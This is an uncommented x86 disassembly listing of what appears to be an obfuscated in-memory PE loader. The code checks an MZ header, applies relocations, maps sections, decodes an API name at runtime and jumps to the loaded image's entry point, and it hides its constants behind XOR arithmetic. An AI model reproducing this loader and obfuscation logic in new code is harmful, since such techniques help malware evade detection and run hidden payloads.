  41c91a:	mov    eax,DWORD PTR [ebp-0x8]
  41c91d:	xor    eax,esi
  41c91f:	lea    ebx,[ebx+eax*1+0x3272e0]
  41c926:	mov    eax,DWORD PTR [ebp-0x4]
  41c929:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c92c:	xor    eax,esi
  41c92e:	add    eax,edi
  41c930:	cmp    DWORD PTR [ecx+ebx*4],eax
  41c933:	jne    0x41c864
  41c939:	mov    edx,DWORD PTR [ebp-0x10]
  41c93c:	mov    eax,DWORD PTR [ebp-0x18]
  41c93f:	mov    ecx,DWORD PTR [ebp-0x2c]
  41c942:	sub    edx,0x3272df
  41c948:	xor    edx,esi
  41c94a:	jmp    0x41c714
  41c94f:	mov    ecx,DWORD PTR [ebp-0x4]
  41c952:	xor    ecx,esi
  41c954:	add    ecx,edi
  41c956:	cmp    eax,ecx
  41c958:	mov    eax,DWORD PTR [ebp-0x4]
  41c95b:	jne    0x41c965
  41c95d:	mov    eax,DWORD PTR [ebp-0x8]
  41c960:	jmp    0x41c965
  41c962:	mov    eax,DWORD PTR [ebp-0x4]
  41c965:	xor    eax,esi
  41c967:	add    eax,edi
  41c969:	pop    edi
  41c96a:	pop    esi
  41c96b:	pop    ebx
  41c96c:	leave  
  41c96d:	ret    0xc
  41c970:	push   ebp
  41c971:	mov    ebp,esp
  41c973:	sub    esp,0x28
  41c976:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41c97d:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41c984:	mov    eax,DWORD PTR [ebp+0xc]
  41c987:	mov    DWORD PTR [ebp+0xc],eax
  41c98a:	push   esi
  41c98b:	mov    eax,eax
  41c98d:	mov    eax,DWORD PTR [ebp-0x4]
  41c990:	mov    esi,DWORD PTR [ebp+0x8]
  41c993:	mov    ecx,0x7510899
  41c998:	xor    eax,ecx
  41c99a:	mov    edx,0x3272e0
  41c99f:	add    eax,edx
  41c9a1:	cmp    esi,eax
  41c9a3:	je     0x41caca
  41c9a9:	mov    eax,DWORD PTR [ebp+0x8]
  41c9ac:	mov    esi,DWORD PTR [ebp+0x8]
  41c9af:	add    esi,DWORD PTR [eax+0x3c]
  41c9b2:	push   edi
  41c9b3:	mov    DWORD PTR [ebp+0xc],esi
  41c9b6:	mov    DWORD PTR [ebp-0x1c],0xf89c85bc
  41c9bd:	mov    eax,DWORD PTR [ebp-0x1c]
  41c9c0:	mov    esi,DWORD PTR [ebp-0x4]
  41c9c3:	mov    edi,DWORD PTR [ebp+0xc]
  41c9c6:	xor    esi,ecx
  41c9c8:	xor    eax,ecx
  41c9ca:	add    esi,edx
  41c9cc:	cmp    DWORD PTR [edi+eax*8+0x1939778],esi
  41c9d3:	je     0x41cac4
  41c9d9:	mov    esi,DWORD PTR [ebp+0xc]
  41c9dc:	mov    eax,DWORD PTR [ebp+0x8]
  41c9df:	add    eax,DWORD PTR [esi+0xa0]
  41c9e5:	mov    esi,DWORD PTR [ebp+0x8]
  41c9e8:	mov    edi,DWORD PTR [ebp+0xc]
  41c9eb:	sub    esi,DWORD PTR [edi+0x34]
  41c9ee:	mov    edi,DWORD PTR [ebp-0x4]
  41c9f1:	xor    edi,ecx
  41c9f3:	add    edi,edx
  41c9f5:	mov    DWORD PTR [ebp-0x24],esi
  41c9f8:	cmp    esi,edi
  41c9fa:	je     0x41cac4
  41ca00:	mov    esi,DWORD PTR [ebp-0x4]
  41ca03:	xor    esi,ecx
  41ca05:	add    esi,edx
  41ca07:	mov    DWORD PTR [ebp-0x8],esi
  41ca0a:	push   ebx
  41ca0b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41ca12:	jmp    0x41caae
  41ca17:	mov    esi,DWORD PTR [ebp-0x4]
  41ca1a:	xor    esi,ecx
  41ca1c:	lea    edi,[ebx-0x8]
  41ca1f:	add    esi,edx
  41ca21:	shr    edi,1
  41ca23:	cmp    esi,edi
  41ca25:	jae    0x41ca94
  41ca27:	sub    edi,esi
  41ca29:	lea    ebx,[eax+esi*2+0x8]
  41ca2d:	mov    DWORD PTR [ebp-0x18],edi
  41ca30:	movzx  esi,WORD PTR [ebx]
  41ca33:	and    esi,0xfff
  41ca39:	mov    DWORD PTR [ebp-0x14],esi
  41ca3c:	mov    edi,DWORD PTR [ebp-0x14]
  41ca3f:	mov    esi,DWORD PTR [eax]
  41ca41:	sub    esi,edx
  41ca43:	add    edi,esi
  41ca45:	movzx  esi,WORD PTR [ebx]
  41ca48:	shr    esi,0xc
  41ca4b:	xor    edi,ecx
  41ca4d:	mov    DWORD PTR [ebp-0x20],edi
  41ca50:	mov    DWORD PTR [ebp-0x14],esi
  41ca53:	mov    esi,DWORD PTR [ebp-0x20]
  41ca56:	mov    edi,DWORD PTR [ebp+0x8]
  41ca59:	xor    esi,ecx
  41ca5b:	lea    esi,[esi+edi*1+0x3272e0]
  41ca62:	mov    DWORD PTR [ebp-0x20],esi
  41ca65:	mov    esi,DWORD PTR [ebp-0x10]
  41ca68:	mov    edi,DWORD PTR [ebp-0x14]
  41ca6b:	xor    esi,ecx
  41ca6d:	add    esi,edx
  41ca6f:	cmp    edi,esi
  41ca71:	jne    0x41ca89
  41ca73:	mov    esi,DWORD PTR [ebp-0x10]
  41ca76:	mov    edi,DWORD PTR [ebp-0x14]
  41ca79:	xor    esi,ecx
  41ca7b:	add    esi,edx
  41ca7d:	cmp    edi,esi
  41ca7f:	jne    0x41ca89
  41ca81:	mov    esi,DWORD PTR [ebp-0x20]
  41ca84:	mov    edi,DWORD PTR [ebp-0x24]
  41ca87:	add    DWORD PTR [esi],edi
  41ca89:	add    ebx,0x2
  41ca8c:	dec    DWORD PTR [ebp-0x18]
  41ca8f:	jne    0x41ca30
  41ca91:	mov    ebx,DWORD PTR [ebp-0xc]
  41ca94:	add    DWORD PTR [ebp-0x8],ebx
  41ca97:	mov    esi,DWORD PTR [ebp-0x1c]
  41ca9a:	mov    edi,DWORD PTR [ebp-0x8]
  41ca9d:	mov    ebx,DWORD PTR [ebp+0xc]
  41caa0:	xor    esi,ecx
  41caa2:	cmp    edi,DWORD PTR [ebx+esi*8+0x193977c]
  41caa9:	jae    0x41cac3
  41caab:	add    eax,DWORD PTR [ebp-0xc]
  41caae:	mov    esi,DWORD PTR [ebp-0x4]
  41cab1:	mov    ebx,DWORD PTR [eax+0x4]
  41cab4:	xor    esi,ecx
  41cab6:	add    esi,edx
  41cab8:	mov    DWORD PTR [ebp-0xc],ebx
  41cabb:	cmp    ebx,esi
  41cabd:	jne    0x41ca17
  41cac3:	pop    ebx
  41cac4:	mov    eax,DWORD PTR [ebp-0x28]
  41cac7:	pop    edi
  41cac8:	jmp    0x41cacd
  41caca:	mov    eax,DWORD PTR [ebp-0x4]
  41cacd:	xor    eax,ecx
  41cacf:	add    eax,edx
  41cad1:	pop    esi
  41cad2:	leave  
  41cad3:	ret    0x8
  41cad6:	push   ebp
  41cad7:	mov    ebp,esp
  41cad9:	sub    esp,0xcc
  41cadf:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41cae6:	mov    DWORD PTR [ebp-0x24],0xf89c85b8
  41caed:	mov    eax,DWORD PTR [ebp-0x4]
  41caf0:	push   ebx
  41caf1:	push   esi
  41caf2:	mov    esi,0x7510899
  41caf7:	xor    eax,esi
  41caf9:	push   edi
  41cafa:	mov    edi,0x3272e0
  41caff:	add    eax,edi
  41cb01:	mov    DWORD PTR [ebp-0x1c],eax
  41cb04:	mov    eax,DWORD PTR [ebp-0x4]
  41cb07:	xor    eax,esi
  41cb09:	add    eax,edi
  41cb0b:	mov    DWORD PTR [ebp-0x8],eax
  41cb0e:	mov    ebx,DWORD PTR [ebp+0x20]
  41cb11:	mov    eax,DWORD PTR [ebp-0x14]
  41cb14:	mov    ecx,DWORD PTR [ebp-0x14]
  41cb17:	xor    eax,ecx
  41cb19:	mov    DWORD PTR [ebp-0x14],eax
  41cb1c:	add    DWORD PTR [ebp-0x14],0xf89cb5b9
  41cb23:	mov    eax,DWORD PTR [ebp-0xc]
  41cb26:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb29:	xor    eax,ecx
  41cb2b:	mov    DWORD PTR [ebp-0xc],eax
  41cb2e:	add    DWORD PTR [ebp-0xc],0xf89c85f9
  41cb35:	mov    eax,DWORD PTR [ebp-0x10]
  41cb38:	mov    ecx,DWORD PTR [ebp-0x10]
  41cb3b:	xor    eax,ecx
  41cb3d:	mov    DWORD PTR [ebp-0x10],eax
  41cb40:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  41cb47:	mov    eax,DWORD PTR [ebp-0x20]
  41cb4a:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb4d:	xor    eax,ecx
  41cb4f:	mov    DWORD PTR [ebp-0x20],eax
  41cb52:	add    DWORD PTR [ebp-0x20],0xf89f05b9
  41cb59:	mov    eax,0x9471
  41cb5e:	mov    WORD PTR [ebp+0x20],ax
  41cb62:	mov    eax,DWORD PTR [ebp+0x8]
  41cb65:	test   eax,eax
  41cb67:	je     0x41cfc2
  41cb6d:	mov    eax,DWORD PTR [ebp+0xc]
  41cb70:	test   eax,eax
  41cb72:	je     0x41cfc2
  41cb78:	mov    eax,DWORD PTR [ebp+0x18]
  41cb7b:	test   eax,eax
  41cb7d:	je     0x41cfc2
  41cb83:	mov    ax,WORD PTR [ebp+0x20]
  41cb87:	mov    ecx,0x8a8c
  41cb8c:	xor    ax,cx
  41cb8f:	mov    ecx,0x3b50
  41cb94:	add    ax,cx
  41cb97:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb9a:	cmp    WORD PTR [ecx],ax
  41cb9d:	jne    0x41cfc2
  41cba3:	mov    eax,DWORD PTR [ebp-0x4]
  41cba6:	xor    eax,esi
  41cba8:	add    eax,edi
  41cbaa:	mov    DWORD PTR [ebp-0x30],eax
  41cbad:	mov    eax,DWORD PTR [ebp-0x4]
  41cbb0:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbb3:	mov    eax,DWORD PTR [ebp+0x8]
  41cbb6:	add    eax,DWORD PTR [ecx+0x3c]
  41cbb9:	mov    DWORD PTR [ebp+0xc],eax
  41cbbc:	mov    eax,DWORD PTR [eax+0x50]
  41cbbf:	test   eax,eax
  41cbc1:	je     0x41cfc2
  41cbc7:	mov    DWORD PTR [ebp-0x2c],0xf88c85b9
  41cbce:	mov    eax,DWORD PTR [ebp-0x2c]
  41cbd1:	xor    eax,esi
  41cbd3:	add    eax,edi
  41cbd5:	mov    DWORD PTR [ebp-0x2c],eax
  41cbd8:	mov    eax,DWORD PTR [ebp-0x4]
  41cbdb:	mov    eax,DWORD PTR [ebx+0x190]
  41cbe1:	mov    ecx,DWORD PTR [eax]
  41cbe3:	mov    ecx,DWORD PTR [ecx+0x3c]
  41cbe6:	add    ecx,DWORD PTR [eax]
  41cbe8:	mov    eax,DWORD PTR [ebp-0x4]
  41cbeb:	mov    eax,DWORD PTR [ebx+0x18c]
  41cbf1:	mov    edx,DWORD PTR [eax]
  41cbf3:	mov    DWORD PTR [ebp-0x18],ecx
  41cbf6:	mov    DWORD PTR [ebp+0x20],edx
  41cbf9:	cmp    edx,edx
  41cbfb:	jne    0x41cc2f
  41cbfd:	mov    eax,DWORD PTR [ebx+0x1d8]
  41cc03:	lea    edx,[ebp-0x1c]
  41cc06:	push   edx
  41cc07:	mov    edx,DWORD PTR [ebp-0xc]
  41cc0a:	xor    edx,esi
  41cc0c:	add    edx,edi
  41cc0e:	push   edx
  41cc0f:	push   DWORD PTR [ecx+0x50]
  41cc12:	push   DWORD PTR [ebp+0x20]
  41cc15:	call   DWORD PTR [eax+0x1c]
  41cc18:	mov    eax,DWORD PTR [ebp-0x18]
  41cc1b:	mov    ecx,DWORD PTR [eax+0x54]
  41cc1e:	mov    eax,DWORD PTR [eax+0x50]
  41cc21:	sub    eax,ecx
  41cc23:	add    ecx,DWORD PTR [ebp+0x20]
  41cc26:	push   ecx
  41cc27:	call   0x41d5ae
  41cc2c:	mov    edx,DWORD PTR [ebp+0x20]
  41cc2f:	mov    eax,DWORD PTR [ebx+0x194]
  41cc35:	mov    DWORD PTR [eax],edx
  41cc37:	mov    eax,DWORD PTR [ebp+0xc]
  41cc3a:	push   DWORD PTR [eax+0x54]
  41cc3d:	push   DWORD PTR [ebp+0x8]
  41cc40:	push   edx
  41cc41:	call   0x41d455
  41cc46:	mov    ecx,DWORD PTR [ebp+0x20]
  41cc49:	mov    eax,DWORD PTR [ecx+0x3c]
  41cc4c:	add    eax,ecx
  41cc4e:	movzx  ecx,WORD PTR [eax+0x14]
  41cc52:	lea    ecx,[ecx+eax*1+0x18]
  41cc56:	mov    DWORD PTR [ebp+0x18],ecx
  41cc59:	mov    ecx,DWORD PTR [ebp-0x4]
  41cc5c:	movzx  edx,WORD PTR [eax+0x6]
  41cc60:	xor    ecx,esi
  41cc62:	add    ecx,edi
  41cc64:	mov    DWORD PTR [ebp+0xc],eax
  41cc67:	cmp    edx,ecx
  41cc69:	je     0x41cd16
  41cc6f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cc72:	xor    ecx,esi
  41cc74:	add    ecx,edi
  41cc76:	mov    DWORD PTR [ebp-0x8],ecx
  41cc79:	mov    ecx,DWORD PTR [ebp-0x24]
  41cc7c:	movzx  edx,WORD PTR [eax+0x6]
  41cc80:	xor    ecx,esi
  41cc82:	sub    edx,ecx
  41cc84:	sub    edx,edi
  41cc86:	cmp    DWORD PTR [ebp-0x8],edx
  41cc89:	ja     0x41cd16
  41cc8f:	mov    edx,DWORD PTR [ebp+0x18]
  41cc92:	add    edx,0x8
  41cc95:	mov    DWORD PTR [ebp+0x18],edx
  41cc98:	jmp    0x41cc9d
  41cc9a:	mov    edx,DWORD PTR [ebp+0x18]
  41cc9d:	mov    eax,DWORD PTR [eax+0x38]
  41cca0:	lea    ecx,[eax-0x1]
  41cca3:	mov    DWORD PTR [ebp-0x34],eax
  41cca6:	mov    eax,DWORD PTR [edx]
  41cca8:	test   ecx,eax
  41ccaa:	je     0x41ccb3
  41ccac:	not    ecx
  41ccae:	and    eax,ecx
  41ccb0:	add    eax,DWORD PTR [ebp-0x34]
  41ccb3:	mov    ecx,DWORD PTR [edx+0x4]
  41ccb6:	add    ecx,DWORD PTR [ebp+0x20]
  41ccb9:	push   ecx
  41ccba:	call   0x41d5ae
  41ccbf:	mov    edx,DWORD PTR [ebp-0x4]
  41ccc2:	mov    eax,DWORD PTR [ebp+0x18]
  41ccc5:	mov    ecx,DWORD PTR [eax+0x8]
  41ccc8:	xor    edx,esi
  41ccca:	add    edx,edi
  41cccc:	cmp    ecx,edx
  41ccce:	je     0x41cce7
  41ccd0:	push   ecx
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	add    ecx,DWORD PTR [eax+0xc]
  41ccd7:	mov    eax,DWORD PTR [eax+0x4]
  41ccda:	add    eax,DWORD PTR [ebp+0x20]
  41ccdd:	push   ecx
  41ccde:	push   eax
  41ccdf:	call   0x41d455
  41cce4:	mov    eax,DWORD PTR [ebp+0x18]
  41cce7:	mov    ecx,DWORD PTR [ebp-0x24]
  41ccea:	mov    edx,DWORD PTR [ebp-0x8]
  41cced:	add    eax,0x28
  41ccf0:	xor    ecx,esi
  41ccf2:	lea    ecx,[edx+ecx*1+0x3272e0]
  41ccf9:	mov    edx,DWORD PTR [ebp+0xc]
  41ccfc:	mov    DWORD PTR [ebp+0x18],eax
  41ccff:	mov    eax,DWORD PTR [ebp-0x24]
  41cd02:	movzx  edx,WORD PTR [edx+0x6]
  41cd06:	xor    eax,esi
  41cd08:	sub    edx,eax
  41cd0a:	mov    eax,DWORD PTR [ebp+0xc]
  41cd0d:	sub    edx,edi
  41cd0f:	mov    DWORD PTR [ebp-0x8],ecx
  41cd12:	cmp    ecx,edx
  41cd14:	jbe    0x41cc9a
  41cd16:	mov    edx,DWORD PTR [ebx+0x18c]
  41cd1c:	mov    ecx,DWORD PTR [ebp+0x20]
  41cd1f:	cmp    ecx,DWORD PTR [edx]
  41cd21:	jne    0x41cd4a
  41cd23:	mov    eax,DWORD PTR [ebx+0x1d8]
  41cd29:	lea    edx,[ebp-0x1c]
  41cd2c:	push   edx
  41cd2d:	mov    edx,DWORD PTR [ebp-0x10]
  41cd30:	xor    edx,esi
  41cd32:	add    edx,edi
  41cd34:	push   edx
  41cd35:	mov    edx,DWORD PTR [ebp-0x18]
  41cd38:	push   DWORD PTR [edx+0x54]
  41cd3b:	push   ecx
  41cd3c:	call   DWORD PTR [eax+0x1c]
  41cd3f:	test   eax,eax
  41cd41:	je     0x41cfb3
  41cd47:	mov    eax,DWORD PTR [ebp+0xc]
  41cd4a:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41cd50:	mov    ecx,DWORD PTR [ecx]
  41cd52:	xor    ecx,esi
  41cd54:	add    ecx,edi
  41cd56:	je     0x41cede
  41cd5c:	and    DWORD PTR [ebp-0x28],0x0
  41cd60:	and    DWORD PTR [ebp+0x8],0x0
  41cd64:	mov    eax,0xf89c851d
  41cd69:	lea    ecx,[eax-0x8]
  41cd6c:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41cd73:	mov    DWORD PTR [ebp-0x48],0xf89c850d
  41cd7a:	mov    DWORD PTR [ebp-0x44],eax
  41cd7d:	mov    DWORD PTR [ebp-0x40],ecx
  41cd80:	mov    DWORD PTR [ebp-0x3c],ecx
  41cd83:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  41cd8a:	mov    edx,DWORD PTR [ebp+0x8]
  41cd8d:	mov    ecx,0x899
  41cd92:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41cd97:	mov    edx,0x72e0
  41cd9c:	add    cx,dx
  41cd9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cda2:	inc    DWORD PTR [ebp+0x8]
  41cda5:	cmp    DWORD PTR [ebp+0x8],0x6
  41cda9:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41cdb1:	jb     0x41cd8a
  41cdb3:	mov    ecx,0xf89c850b
  41cdb8:	mov    DWORD PTR [ebp-0xa4],eax
  41cdbe:	mov    DWORD PTR [ebp-0x90],eax
  41cdc4:	mov    DWORD PTR [ebp-0x68],eax
  41cdc7:	mov    DWORD PTR [ebp-0x64],eax
  41cdca:	lea    eax,[ecx-0x1]
  41cdcd:	mov    edx,0xf89c85ff
  41cdd2:	mov    DWORD PTR [ebp-0x58],eax
  41cdd5:	mov    DWORD PTR [ebp-0x54],eax
  41cdd8:	mov    DWORD PTR [ebp-0xa8],0xf89c85f5
  41cde2:	mov    DWORD PTR [ebp-0xa0],ecx
  41cde8:	mov    DWORD PTR [ebp-0x9c],edx
  41cdee:	mov    DWORD PTR [ebp-0x98],0xf89c8510
  41cdf8:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ce02:	mov    DWORD PTR [ebp-0x8c],0xf89c85fc
  41ce0c:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ce16:	mov    DWORD PTR [ebp-0x84],0xf89c850d
  41ce20:	mov    DWORD PTR [ebp-0x80],ecx
  41ce23:	mov    DWORD PTR [ebp-0x7c],0xf89c8500
  41ce2a:	mov    DWORD PTR [ebp-0x78],edx
  41ce2d:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41ce34:	mov    DWORD PTR [ebp-0x70],ecx
  41ce37:	mov    DWORD PTR [ebp-0x6c],0xf89c85f8
  41ce3e:	mov    DWORD PTR [ebp-0x60],ecx
  41ce41:	mov    DWORD PTR [ebp-0x5c],0xf89c851c
  41ce48:	mov    DWORD PTR [ebp-0x50],0xf89c85b9
  41ce4f:	xor    eax,eax
  41ce51:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41ce58:	xor    cl,0x99
  41ce5b:	sub    cl,0x20
  41ce5e:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41ce65:	inc    eax
  41ce66:	cmp    eax,0x17
  41ce69:	jb     0x41ce51
  41ce6b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ce71:	lea    ecx,[ebp-0xb4]
  41ce77:	push   ecx
  41ce78:	call   DWORD PTR [eax+0x4]
  41ce7b:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41ce81:	lea    edx,[ebp-0xcc]
  41ce87:	push   edx
  41ce88:	push   eax
  41ce89:	call   DWORD PTR [ecx+0x8]
  41ce8c:	lea    ecx,[ebp-0x28]
  41ce8f:	push   ecx
  41ce90:	mov    ecx,DWORD PTR [ebx+0x18c]
  41ce96:	push   DWORD PTR [ecx]
  41ce98:	call   eax
  41ce9a:	mov    eax,DWORD PTR [ebp-0x28]
  41ce9d:	test   eax,eax
  41ce9f:	je     0x41cedb
  41cea1:	mov    DWORD PTR [ebp+0x8],eax
  41cea4:	jmp    0x41ceb0
  41cea6:	mov    eax,DWORD PTR [eax]
  41cea8:	mov    DWORD PTR [ebp-0x28],eax
  41ceab:	cmp    eax,DWORD PTR [ebp+0x8]
  41ceae:	je     0x41cebd
  41ceb0:	mov    edx,DWORD PTR [eax+0x18]
  41ceb3:	mov    ecx,DWORD PTR [ebx+0x18c]
  41ceb9:	cmp    edx,DWORD PTR [ecx]
  41cebb:	jne    0x41cea6
  41cebd:	mov    edx,DWORD PTR [eax+0x18]
  41cec0:	mov    ecx,DWORD PTR [ebx+0x18c]
  41cec6:	cmp    edx,DWORD PTR [ecx]
  41cec8:	jne    0x41cedb
  41ceca:	mov    edx,DWORD PTR [ebp-0x18]
  41cecd:	mov    ecx,DWORD PTR [ebx+0x190]
  41ced3:	mov    edx,DWORD PTR [edx+0x28]
  41ced6:	add    edx,DWORD PTR [ecx]
  41ced8:	mov    DWORD PTR [eax+0x1c],edx
  41cedb:	mov    eax,DWORD PTR [ebp+0xc]
  41cede:	push   ebx
  41cedf:	push   eax
  41cee0:	push   DWORD PTR [ebp+0x20]
  41cee3:	call   0x41c68d
  41cee8:	test   eax,eax
  41ceea:	je     0x41cfb3
  41cef0:	push   DWORD PTR [ebp+0xc]
  41cef3:	mov    ecx,ebx
  41cef5:	push   DWORD PTR [ebp+0x20]
  41cef8:	call   0x41c5e6
  41cefd:	test   eax,eax
  41ceff:	je     0x41cfb3
  41cf05:	mov    eax,DWORD PTR [ebp+0xc]
  41cf08:	mov    edx,DWORD PTR [ebp+0x20]
  41cf0b:	mov    ecx,ebx
  41cf0d:	call   0x41c4bf
  41cf12:	test   eax,eax
  41cf14:	je     0x41cfb3
  41cf1a:	push   ebx
  41cf1b:	push   DWORD PTR [ebp+0x20]
  41cf1e:	call   0x41c970
  41cf23:	test   eax,eax
  41cf25:	je     0x41cfb3
  41cf2b:	mov    eax,DWORD PTR [ebx+0x18c]
  41cf31:	mov    edx,DWORD PTR [ebp+0x20]
  41cf34:	cmp    edx,DWORD PTR [eax]
  41cf36:	jne    0x41cf52
  41cf38:	mov    eax,DWORD PTR [ebx+0x1d8]
  41cf3e:	lea    ecx,[ebp-0x1c]
  41cf41:	push   ecx
  41cf42:	push   DWORD PTR [ebp-0x1c]
  41cf45:	mov    ecx,DWORD PTR [ebp-0x18]
  41cf48:	push   DWORD PTR [ecx+0x54]
  41cf4b:	push   edx
  41cf4c:	call   DWORD PTR [eax+0x1c]
  41cf4f:	mov    edx,DWORD PTR [ebp+0x20]
  41cf52:	mov    eax,DWORD PTR [ebx+0x1c8]
  41cf58:	mov    eax,DWORD PTR [eax]
  41cf5a:	xor    eax,esi
  41cf5c:	add    eax,edi
  41cf5e:	je     0x41cf97
  41cf60:	mov    ecx,DWORD PTR [ebp+0xc]
  41cf63:	mov    eax,DWORD PTR [ecx+0x28]
  41cf66:	mov    DWORD PTR [ebp+0x8],0xf89ca5b9
  41cf6d:	mov    esi,DWORD PTR [ebp+0x8]
  41cf70:	push   DWORD PTR [ebp+0x14]
  41cf73:	xor    esi,0x899
  41cf79:	push   DWORD PTR [ebp+0x10]
  41cf7c:	add    esi,0x72e0
  41cf82:	or     WORD PTR [ecx+0x16],si
  41cf86:	add    eax,edx
  41cf88:	push   edx
  41cf89:	call   eax
  41cf8b:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b8
  41cf95:	jmp    0x41cfa1
  41cf97:	mov    eax,DWORD PTR [ebp+0xc]
  41cf9a:	mov    eax,DWORD PTR [eax+0x28]
  41cf9d:	add    eax,edx
  41cf9f:	call   eax
  41cfa1:	mov    DWORD PTR [ebp-0x8],eax
  41cfa4:	mov    eax,DWORD PTR [ebp-0x8]
  41cfa7:	mov    ecx,DWORD PTR [ebp+0x1c]
  41cfaa:	mov    DWORD PTR [ecx],eax
  41cfac:	mov    DWORD PTR [ebp-0x30],0x1
  41cfb3:	cmp    DWORD PTR [ebp-0x30],0x0
  41cfb7:	jne    0x41cfbd
  41cfb9:	and    DWORD PTR [ebp+0x20],0x0
  41cfbd:	mov    eax,DWORD PTR [ebp+0x20]
  41cfc0:	jmp    0x41cfc4
  41cfc2:	xor    eax,eax
  41cfc4:	pop    edi
  41cfc5:	pop    esi
  41cfc6:	pop    ebx
  41cfc7:	leave  
  41cfc8:	ret    0x1c
  41cfcb:	push   ebp
  41cfcc:	mov    ebp,esp
  41cfce:	movzx  edx,WORD PTR [ecx+0x6]
  41cfd2:	movzx  eax,WORD PTR [ecx+0x14]
  41cfd6:	push   ebx
  41cfd7:	push   edi
  41cfd8:	xor    edi,edi
  41cfda:	lea    eax,[eax+ecx*1+0x18]
  41cfde:	test   edx,edx
  41cfe0:	je     0x41d001
  41cfe2:	mov    ecx,DWORD PTR [eax+0xc]
  41cfe5:	lea    ebx,[ecx+esi*1]
  41cfe8:	cmp    DWORD PTR [ebp+0x8],ebx
  41cfeb:	jb     0x41cff9
  41cfed:	mov    ebx,DWORD PTR [eax+0x8]
  41cff0:	add    ebx,ecx
  41cff2:	add    ebx,esi
  41cff4:	cmp    DWORD PTR [ebp+0x8],ebx
  41cff7:	jb     0x41d003
  41cff9:	add    eax,0x28
  41cffc:	inc    edi
  41cffd:	cmp    edi,edx
  41cfff:	jb     0x41cfe2
  41d001:	xor    eax,eax
  41d003:	pop    edi
  41d004:	pop    ebx
  41d005:	pop    ebp
  41d006:	ret    0x4
  41d009:	push   ebp
  41d00a:	mov    ebp,esp
  41d00c:	sub    esp,0x34
  41d00f:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41d016:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41d01d:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41d024:	mov    DWORD PTR [ebp-0x8],0xf89c8518
  41d02b:	mov    DWORD PTR [ebp-0x20],0xf89c85f8
  41d032:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41d039:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41d040:	mov    DWORD PTR [ebp-0x10],eax
  41d043:	mov    eax,DWORD PTR [ebp+0x8]
  41d046:	mov    DWORD PTR [ebp-0x14],eax
  41d049:	mov    eax,DWORD PTR [ebp-0xc]
  41d04c:	push   ebx
  41d04d:	mov    ecx,0x7510899
  41d052:	xor    eax,ecx
  41d054:	push   esi
  41d055:	mov    esi,DWORD PTR [ebp-0x10]
  41d058:	mov    edx,0x3272e0
  41d05d:	add    eax,edx
  41d05f:	push   edi
  41d060:	cmp    esi,eax
  41d062:	je     0x41d241
  41d068:	mov    eax,DWORD PTR [ebp-0xc]
  41d06b:	mov    esi,DWORD PTR [ebp-0x14]
  41d06e:	xor    eax,ecx
  41d070:	add    eax,edx
  41d072:	cmp    esi,eax
  41d074:	je     0x41d241
  41d07a:	mov    eax,DWORD PTR [ebp-0xc]
  41d07d:	xor    eax,ecx
  41d07f:	add    eax,edx
  41d081:	mov    DWORD PTR [ebp-0x24],eax
  41d084:	mov    eax,DWORD PTR [ebp-0xc]
  41d087:	xor    eax,ecx
  41d089:	add    eax,edx
  41d08b:	mov    DWORD PTR [ebp-0x28],eax
  41d08e:	mov    edi,DWORD PTR [ebp-0x20]
  41d091:	mov    ebx,DWORD PTR [ebp-0x8]
  41d094:	mov    esi,0x899
  41d099:	xor    edi,esi
  41d09b:	mov    eax,0x72e0
  41d0a0:	xor    ebx,esi
  41d0a2:	add    edi,eax
  41d0a4:	add    ebx,eax
  41d0a6:	sub    ebx,edi
  41d0a8:	mov    WORD PTR [ebp-0x8],bx
  41d0ac:	jmp    0x41d171
  41d0b1:	mov    edi,DWORD PTR [ebp-0xc]
  41d0b4:	mov    bx,WORD PTR [ebp-0x4]
  41d0b8:	xor    edi,esi
  41d0ba:	add    edi,eax
  41d0bc:	cmp    bx,di
  41d0bf:	je     0x41d1b3
  41d0c5:	mov    edi,DWORD PTR [ebp-0xc]
  41d0c8:	mov    ebx,DWORD PTR [ebp+0xc]
  41d0cb:	xor    edi,ecx
  41d0cd:	add    edi,edx
  41d0cf:	cmp    ebx,edi
  41d0d1:	mov    di,WORD PTR [ebp-0x4]
  41d0d5:	mov    bx,WORD PTR [ebp+0x8]
  41d0d9:	je     0x41d144
  41d0db:	cmp    bx,di
  41d0de:	je     0x41d14d
  41d0e0:	mov    edi,DWORD PTR [ebp-0x20]
  41d0e3:	mov    bx,WORD PTR [ebp+0x8]
  41d0e7:	xor    edi,esi
  41d0e9:	add    edi,eax
  41d0eb:	cmp    bx,di
  41d0ee:	jb     0x41d10e
  41d0f0:	mov    edi,DWORD PTR [ebp-0x2c]
  41d0f3:	mov    bx,WORD PTR [ebp+0x8]
  41d0f7:	xor    edi,esi
  41d0f9:	add    edi,eax
  41d0fb:	cmp    bx,di
  41d0fe:	ja     0x41d10e
  41d100:	movzx  edi,WORD PTR [ebp+0x8]
  41d104:	movzx  ebx,WORD PTR [ebp-0x8]
  41d108:	add    edi,ebx
  41d10a:	mov    WORD PTR [ebp+0x8],di
